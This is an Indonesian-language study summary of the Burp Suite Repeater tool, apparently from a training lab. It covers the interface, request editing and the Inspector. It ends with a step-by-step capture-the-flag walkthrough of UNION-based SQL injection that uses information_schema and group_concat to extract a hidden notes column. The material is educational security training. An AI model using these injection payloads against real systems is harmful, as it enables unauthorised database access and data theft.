```
=== Burp Suite Repeater - Resume Materi ===
[22 Apr 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 APA ITU BURP SUITE REPEATER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Modul di Burp Suite untuk menangkap, mengedit,
           dan mengirim ulang HTTP request secara manual
Fungsi   : Manipulasi request berkali-kali dengan modifikasi kecil
Kegunaan : Manual testing endpoint, bypass firewall, SQL Injection,
           uji validasi parameter form
Alternatif: Bisa buat request dari nol (seperti cURL)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 6 BAGIAN ANTARMUKA REPEATER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Request List     → Daftar request aktif (pojok kiri atas tab)
                      Bisa kelola banyak request sekaligus
2. Request Controls → Tombol Send, Cancel, navigasi riwayat request
                      Letaknya di bawah Request List
3. Request &        → Area utama — kiri untuk edit request,
   Response View      kanan untuk lihat respons server
4. Layout Options   → Atur tampilan: horizontal (default),
                      vertikal, atau tab terpisah
5. Inspector        → Panel kanan — analisis & edit request
                      secara visual, lebih intuitif dari raw editor
6. Target           → Kolom IP/domain tujuan request
                      Terisi otomatis jika dari komponen Burp lain

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 CARA KIRIM REQUEST KE REPEATER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Cara 1   : Di Proxy → klik kanan request → Send to Repeater
Cara 2   : Shortcut keyboard → Ctrl + R
Cara 3   : Buat manual langsung di Request view

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 BASIC USAGE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Tangkap request di Proxy → Send to Repeater
- Klik Send → Response view terisi HTML dari server
- Edit request view → klik Send lagi → respons update otomatis
- Tombol history (kanan Send) → navigasi maju/mundur versi request
- Contoh edit : ubah header Connection: close → open
  Hasil       : server balas Connection: keep-alive

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 4 TAMPILAN RESPONSE (MESSAGE ANALYSIS TOOLBAR)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Pretty  → Default, raw response + formatting ringan → lebih mudah dibaca
Raw     → Respons mentah persis dari server, tanpa formatting
Hex     → Representasi byte-level, berguna untuk file biner
Render  → Tampilan visual seperti di browser

Tombol \n (Show non-printable characters)
        → Tampilkan karakter tersembunyi seperti \r\n
        → \r\n = carriage return + new line (penting di HTTP headers)
        → Tidak wajib, tapi berguna di situasi tertentu

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 INSPECTOR — KOMPONEN & FUNGSI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Posisi   : Sisi paling kanan, tersedia di Proxy & Repeater
Fungsi   : Breakdown visual request/respons, lebih intuitif dari raw

Komponen :
  Request Attributes    → Edit lokasi, method (GET/POST), protokol
                          (HTTP/1 ↔ HTTP/2)
  Request Query Params  → Data di URL setelah tanda ?
                          Contoh: ?redirect=false → key=redirect, value=false
  Request Body Params   → Data POST yang dikirim di body request
  Request Cookies       → Daftar cookie yang dikirim, bisa diedit
  Request Headers       → Semua header request, bisa tambah/edit/hapus
  Response Headers      → Header dari server → READ ONLY (tidak bisa diedit)
                          Hanya muncul setelah ada respons

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SQL INJECTION VIA REPEATER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Konsep   : Server susun query dari input URL secara langsung
           → input tidak disanitasi = bisa diinjeksi

Ciri SQLi : Tambah tanda kutip tunggal → server error 500
            Contoh: GET /about/2' HTTP/1.1

UNION    : Gabungkan query kita dengan query asli server
Syarat   : Jumlah kolom harus sama dengan query asli
           → kolom kosong diisi null

ID = 0   : Paksa query asli tidak return data
           → hanya data injeksi yang muncul

information_schema : "Peta" database — menyimpan info struktur semua tabel
                     Sub-tabel penting: columns
                     Isi: daftar semua kolom dari semua tabel

group_concat() : Gabungkan semua hasil jadi satu baris dipisah koma
                 → tanpanya hanya baris pertama yang muncul

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR UNION SQLi (EXTRA-MILE CHALLENGE)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Target   : Ambil kolom notes milik CEO dari tabel people
Endpoint : /about/ID

Step 1 — Cek kerentanan
  GET /about/2' HTTP/1.1
  → Server error 500 = SQLi ada

Step 2 — Baca pesan error → dapat info:
  Nama tabel : people
  Kolom query: firstName, lastName, pfpLink, role, bio (5 kolom)

Step 3 — Cari nama semua kolom (satu per satu dulu):
  /about/0 UNION ALL SELECT column_name,null,null,null,null
  FROM information_schema.columns WHERE table_name="people"
  → Dapat: id

Step 4 — Ambil semua kolom sekaligus pakai group_concat:
  /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null
  FROM information_schema.columns WHERE table_name="people"
  → Dapat: id,firstName,lastName,pfpLink,role,shortRole,bio,notes

Step 5 — Ambil flag dari kolom notes milik CEO (id=1):
  /about/0 UNION ALL SELECT notes,null,null,null,null
  FROM people WHERE id=1
  → FLAG muncul di title halaman response

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Intercepted Request  = request yang ditangkap Burp sebelum sampai server
Payload              = data/input yang dikirim untuk mengeksploitasi celah
Endpoint             = URL/path spesifik di aplikasi web (misal /about/2)
Union Query          = teknik SQL menggabungkan dua SELECT sekaligus
information_schema   = database bawaan MySQL berisi metadata semua tabel
group_concat()       = fungsi SQL gabungkan banyak baris jadi satu string
null                 = nilai kosong untuk memenuhi syarat jumlah kolom UNION
Verbose Error        = pesan error server yang terlalu detail → bocorkan info
SQLi                 = SQL Injection, injeksi query SQL ke input aplikasi
```